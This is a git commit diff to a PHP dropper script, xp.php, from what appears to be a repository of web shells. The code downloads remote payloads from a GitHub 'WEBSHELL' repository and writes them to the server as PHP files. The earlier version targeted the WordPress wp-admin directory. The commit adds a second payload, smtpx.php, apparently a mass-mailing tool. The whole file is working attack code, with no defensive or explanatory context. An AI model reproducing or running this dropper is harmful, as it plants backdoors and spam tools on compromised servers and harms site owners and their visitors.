a13d49a735f442226b75191ea07674c23257c471
botersx <61366336+botersx@users.noreply.github.com>
2020-03-07 23:50:57 +0700

    Update xp.php

--- xp.php
+++ xp.php
@@ -8,13 +8,22 @@ function http_get($url){
 	return curl_exec($im);
 	curl_close($im);
 }
-$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/v.php" ;
+$check = "./xps.php" ;
 $text = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/xp.txt');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
 if(file_exists($check)){
     echo "Done Reset ===>  ".$check."</br>";
+}else 
+echo "Fail Reset" ;
+$check2 = "./smtpx.php" ;
+$text2 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/smtpx.txt');
+$open2 = fopen($check2, 'w');
+fwrite($open2, $text2);
+fclose($open2);
+if(file_exists($check2)){
+    echo "Done Reset ===>  ".$check2."</br>";
 }else 
 echo "Fail Reset" ;
 ?>
